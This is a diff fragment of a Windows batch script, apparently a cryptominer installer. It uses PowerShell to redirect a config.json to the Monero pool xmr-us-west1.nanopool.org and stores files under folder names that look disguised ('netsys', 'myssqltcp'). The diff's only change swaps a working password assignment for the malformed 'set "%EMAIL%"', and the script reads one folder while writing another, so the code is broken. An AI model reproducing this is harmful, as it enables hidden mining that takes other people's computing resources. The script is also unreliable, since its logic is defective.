@@ -293,7 +293,7 @@ if [%PASS%] == [] (
   set PASS=na
 )
 if not [%EMAIL%] == [] (
-  set "PASS=%EMAIL%"
+  set "%EMAIL%"
 )
 
 powershell -Command "$out = cat '%USERPROFILE%\netsys\config.json' | %%{$_ -replace '\"url\": *\".*\",', '\"url\": \"xmr-us-west1.nanopool.org:%PORT%\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\myssqltcp\config.json'" 
